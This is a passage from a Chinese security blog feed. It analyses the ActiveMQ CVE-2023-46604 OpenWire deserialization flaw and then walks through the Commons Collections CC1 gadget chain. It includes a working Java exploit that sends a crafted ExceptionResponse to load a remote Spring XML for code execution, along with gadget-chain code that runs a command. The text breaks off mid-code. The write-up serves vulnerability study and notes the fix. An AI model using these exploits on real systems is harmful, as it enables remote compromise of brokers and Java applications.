程序就会优先使用当前源码目录里的 TcpTransport 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这里只写了重构的函数，需要将类中必要的其他内容copy</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">oneway</span><span class="hljs-params">(Object command)</span> <span class="hljs-keyword">throws</span> IOException {<br>    <span class="hljs-built_in">this</span>.checkStarted();<br>    <span class="hljs-type">Throwable</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"http://127.0.0.1:8000/poc.xml"</span>);<br>    <span class="hljs-type">ExceptionResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionResponse</span>(obj);<br>    <span class="hljs-built_in">this</span>.wireFormat.marshal(response, <span class="hljs-built_in">this</span>.dataOut);<br>    <span class="hljs-built_in">this</span>.dataOut.flush();<br>}<br></code></pre></td></tr></table></figure><p>然后是 createThrowable 方法的利用,  因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 ClassPathXmlApplicationContext 加载 XML实现 RCE</p><p>在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以我在这里同样 patch 了 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类</p><p>最后成功触发</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717145629917.png" class="" title="image-20240717145629917"><h2 id="编写Exp"><a href="#编写Exp" class="headerlink" title="编写Exp"></a>编写Exp</h2><p>上面的分析都是基于ActiveMQ提供的client来进行发送恶意数据进行RCE，但是其实可以直接构造OpenWire协议的流量发送给ActiveMQ进行解析，从而不用进行patch操作。</p><p><a href="https://activemq.apache.org/components/classic/documentation/openwire-version-2-specification">官方关于OpenWire协议的定义</a></p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717152851161.png" class="" title="image-20240717152851161"><p>也就是大概三部分：size、type、data，同时也可以在官方解释的下文发现，type=31正好就是我们需要的<code>ExceptionResponse</code></p><p>然后数据部分也就是官方说的<code>command-specific-fields</code>部分的要求，对于string类型的数据采用UTF-8进行编码</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717153254538.png" class="" title="image-20240717153254538"><p>通过wireshark抓包分析数据包具体格式，还需要一些其他字段</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717154424495.png" class=""><p>最后构造Exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {<br>    <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">61616</span>);<br>    <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>    <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(os);<br>    dos.writeInt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// size</span><br>    dos.writeByte(<span class="hljs-number">31</span>);<span class="hljs-comment">// type</span><br>    dos.writeInt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// CommandId</span><br>    dos.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-comment">// Command response required</span><br>    dos.writeInt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// CorrelationId</span><br><br>    <span class="hljs-comment">// body</span><br>    dos.writeBoolean(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">// UTF</span><br>    dos.writeBoolean(<span class="hljs-literal">true</span>);<br>    dos.writeUTF(<span class="hljs-string">"org.springframework.context.support.ClassPathXmlApplicationContext"</span>);<br>    dos.writeBoolean(<span class="hljs-literal">true</span>);<br>    dos.writeUTF(<span class="hljs-string">"http://127.0.0.1:8000/poc.xml"</span>);<br><br>    dos.close();<br>    os.close();<br>    socket.close();<br>}<br></code></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p> <code>BaseDataStreamMarshaller</code>类加入了<code>validateIsThrowable</code>方法，判断我们传入的类是否合法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateIsThrowable</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> {<br>    <span class="hljs-keyword">if</span> (!Throwable.class.isAssignableFrom(clazz)) {<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Class "</span> + <br>                                           clazz + <br>                                           <span class="hljs-string">" is not assignable to Throwable"</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1链分析</title>
    <link href="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>Java安全的里程碑，CC链！</p><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>​Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发，⽽正是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。</p><p>​commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个java反序列化漏洞后，就像打开了java安全的新世界大门一样，之后很多java中间件相继都爆出反序列化漏洞。本文分析java反序列化CC1链，前置知识是java安全基础中的反射。</p><h3 id="Java机制：反射"><a href="#Java机制：反射" class="headerlink" title="Java机制：反射"></a>Java机制：反射</h3><p>​<a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html">参考文章</a></p><p>​JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><p>​在Java中，Class类与java.lang.reflect类库一起对反射技术进行了全力的支持。在反射包中，我们常用的类主要有Constructor类表示的是Class 对象所表示的类的构造方法，利用它可以在运行时动态创建对象、Field表示Class对象所表示的类的成员变量，通过它可以在运行时动态修改成员变量的属性值(包含private)、Method表示Class对象所表示的类的成员方法，通过它可以动态调用对象的方法(包含private)。</p><p>​总之简单来说，就是我们可以在Java程序运行时去操作类。调度反射方法，最终是由jvm执行invoke()执行。</p><p><a href="https://blog.csdn.net/Jayjay___/article/details/133621214">参考文章</a></p><h2 id="分析准备"><a href="#分析准备" class="headerlink" title="分析准备"></a>分析准备</h2><p>环境配置：</p><ul><li>CommonsCollections &lt;= 3.2.1</li><li>java &lt; 8u71</li></ul><p>Maven依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler.readObject()--&gt;<br>AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;<br>TransformedMap.checkSetValue()--&gt;<br>ChainedTransformer.transform()--&gt;<br>InvokerTransformer.transform()<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>分析应当是自底向上的，从脆弱点开始，经过一步一步封装成为一条完整的利用链。</strong></p><p><strong>分析的时候建议在Maven中把依赖的源码下载下来。</strong></p><h3 id="脆弱点分析"><a href="#脆弱点分析" class="headerlink" title="脆弱点分析"></a>脆弱点分析</h3><p>脆弱点：<code>org.apache.commons.collections.Transformer</code>，transform方法有21种实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.commons.collections;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> {<br>    Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object var1)</span>;<br>}<br></code></pre></td></tr></table></figure><p>脆弱类：Invoketransformer，我们重点看它的transform方法，发现可以执行传入的对象中的方法，显然这里可以执行任意代码。</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240708162534863.png" class="" title="image-20240708162534863"><p>下面是Invoketansformer的一个构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    iMethodName = methodName;<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>}<br></code></pre></td></tr></table></figure><p>首先先尝试直接利用Invoketransformer来执行命令，我们只需要按照上面的构造函数去生成一个对象，然后调用它的transform方法。要执行系统命令，methodName为<code>exec</code>，参数类型为String，参数为<code>calc</code>。在transform中我们只需要传入Runtime类的实例，使用Runtime.getRuntime()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}).transform(Runtime.getRuntime());<br>    }<br>}<br></code></pre></td></tr></table></figure><p>直接运行，执行弹出计算器命令：</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710090205947.png" class="" title="image-20240710090205947"><h3 id="构造序列化链"><a href="#构造序列化链" class="headerlink" title="构造序列化链"></a>构造序列化链</h3><p>当然在实际的漏洞中，不可能直接就这么触发，一定是经过了多层调用，当恶意payload执行到这里才会造成RCE。我们就这么盲目地去找吗，当然不是，我们这里是反序列化漏洞，所以最顶层的调用一定是某个readObject()方法。</p><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用，readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法，如果该方法书写不当的话就有可能引发恶意代码的执行。</p><p>那么接下来我们继续分析，按住ctrl单击transform函数查看调用它的函数，我们跳转到<code>TransformedMap</code>类的<code>transform</code>函数中</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710104121758.png" class="" title="image-20240710104121758"><p>可以发现是一个叫<code>checkSetValue</code>的函数，就一行很简单直接调用了transform，我们接着查看对它的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> {<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>}<br></code></pre></td></tr></table></figure><p>发现对它的调用只有一处，直接跳转了，在AbstractInputCheckedMapDecorator中的setValue函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> {<br>    value = parent.checkSetValue(value);<br>    <span class="hljs-keyword">return</span> entry.setValue(value);<br>}<br></code></pre></td></tr></table></figure><p>通过上面的分析，我们可以进一步的构造我们的代码：</p><p>要调用setValue这个函数很简单，因为它是一个共有函数，那么下一步是解决如何构造TransformedMap的一个实例，然后去作为setValue函数的参数，发现它的构造函数是一个受保护的，所以去找哪里可以调用函数构造它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {<br>    <span class="hljs-built_in">super</span>(map);<br>    <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>    <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>}<br></code></pre></td></tr></table></figure><p>查看对构造函数的调用，发现它有一个叫decorate的函数可以构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, </span><br><span class="hljs-params">                           Transformer valueTransformer)</span> {<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>}<br></code></pre></td></tr></table></figure><p>那么到这里我们就可以写出当前的利用链了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>    <span class="hljs-comment">// 获取一个runtime实例</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-comment">// 第一层</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <br>        <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>    <span class="hljs-comment">// 第二层</span><br>    Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">"Hacking"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">// TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.<br>                                         decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator类中的MapEntry类的setValue()方法（作用是遍历map）</span><br>    <span class="hljs-keyword">for</span>(Map.Entry entry:transformedMap.entrySet()){<br>        entry.setValue(shell);<br>    }<br>}<br></code></pre></td></tr></table></figure><p>可以成功弹出计算器：</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710140835192.png" class=""><p>此时我们右键setValue函数查看调用，发现在AnnotationInvocationHandler类中一处readObject函数对它进行了调用。</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710105700846.png" class="" title="image-20240710105700846"><p>注意：如果你的调用中没有出现这个类，你应当下载源码，<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/6bfaecb8ff77/src/share/classes/sun">jdk下载网页</a>，下载后解压其中/src/share/classes/sun到自己jdk的src文件夹中</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710141928459.png" class=""><p>找到自己的文件夹，解压进去，</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142053339.png" class=""><p>然后在IDEA中项目属性里添加源码路径，CTRL+shift+alt+s打开</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710142224933.png" class="" title="image-20240710142224933"><p>ok，现在你已经可以找到我们的最后的入口函数了，可以发现readObject正好符合我们的调用方式，用构造的恶意序列化流进入这处readObject就可以完成CC1链了，但是有一个问题，AnnotationInvocationHandler类不是公开的，仅可在同一个包下可访问也就是在外面无法通过名字来调用，因此<strong>只可以用反射获取这个类</strong>。</p><p>这个类的构造方法为，也就是说需要一个注解类和一个Map类，这个注解类的选取是有讲究的，后面再探，先设置为Override注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, <br>                            Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>然后我们通过反射调用readObject方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Override.class, transformedMap);<br></code></pre></td></tr></table></figure><p>于是乎，我们现在的代码应该写成下面这样：记得抛出异常和写好序列化和反序列化函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{<br>    <span class="hljs-comment">// 获取一个runtime实例</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-comment">// 第一层</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>    <span class="hljs-comment">// 第二层</span><br>    Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    map.put(<span class="hljs-string">"Hacking"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">//TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    <span class="hljs-comment">//构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>    <span class="hljs-comment">// 通过反射获取AnnotationInvocationHandler的实例</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>    annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Override.class, transformedMap);<br>    serialize(obj);<br>    unserialize(<span class="hljs-string">"./exec.bin"</span>);<br><br>}<br><br><span class="hljs-comment">//序列化方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"./exec.bin"</span>));<br>    oos.writeObject(object);<br>}<br><br><span class="hljs-comment">//反序列化方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>    objectInputStream.readObject();<br>}<br></code></pre></td></tr></table></figure><h3 id="链子中的小巧思"><a href="#链子中的小巧思" class="headerlink" title="链子中的小巧思"></a>链子中的小巧思</h3><p>可以发现写完这段运行之后并没有弹出计算器，其实一条可用的序列化链的构造是非常精心的，里面有许多弯弯绕绕，并不是应该这么写所以就这么写，每一个环节都有其出现的必要性。这里我们正向调试一番，看看问题到底出现在哪里：</p><p>首先在序列化函数中的readObject方法处打上断点，</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711144412509.png" class="" title="image-20240711144412509"><p>你可以选择一步一步调试去分析整个反序列化的过程，这里我就不单步调试了，我们直到obj的最后一层是一个AnnotationInvocationHandler的实例，那么我们就直接在它的readObject函数打上断点，直接恢复项目运行，可以发现到了我们的断点处，然后可以单步调试了</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150022111.png" class="" title="image-20240711150022111"><p>发现在下面判断memberType时，<code>memberType==null</code>，直接就跳转到了函数末尾，所以根本就没有执行之后的序列化过程。</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711150233063.png" class="" title="image-20240711150233063"><p>ok，这里出问题，那么怎么解决呢，找到memberTypes从哪里来的，在上面几行代码中，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br>Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br></code></pre></td></tr></table></figure><p>这里就和我说的在构造该对象时，注解类的问题了，<strong>Override根本就没有成员，所以为null，所以构造的时候注解的选取不是随意的</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override {<br>}<br></code></pre></td></tr></table></figure><p>所以我们将源代码的map的key改为Target注解中的成员变量value，构造时传入Target类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 第二层</span><br>Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(<span class="hljs-string">"value"</span>,<span class="hljs-string">"3xsh0re"</span>);<br><span class="hljs-comment">//...</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);<br></code></pre></td></tr></table></figure><p>重新调试到此处，发现已经成功绕过第一层if了</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240711152007941.png" class="" title="image-20240711152007941"><p>此时我们运行整个代码发现报错了，这是为什么呢，其实是因为Runtime类没有继承serialize接口，所以runtime对象不能被序列化，自然也不能被反序列化。这里解决方法，非常巧妙，<strong>虽然Runtime对象不可以被序列化，但是Class对象可以被序列化。</strong>那么结合InvokerTransformer和反射可以写出下面的代码：</p><p>其实非常好理解，比如第一个，就是执行<code>getDeclaredMethod</code>找到<code>getRuntime</code>函数。</p><p>实现逻辑，构造对象的参数是<code>getDeclaredMethod</code>和<code>getRuntime</code>的对象，执行它的<code>transform</code>方法，在这个方法中，<code>Runtime.class</code>的作用是通过<code>getMethod</code>找到它的<code>getDeclaredMethod</code>函数，然后将<code>getRuntime</code>作为参数。</p><p>这整个语句的返回值就是<code>getRuntime</code>函数，即<code>getDeclaredMethod</code>的返回值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 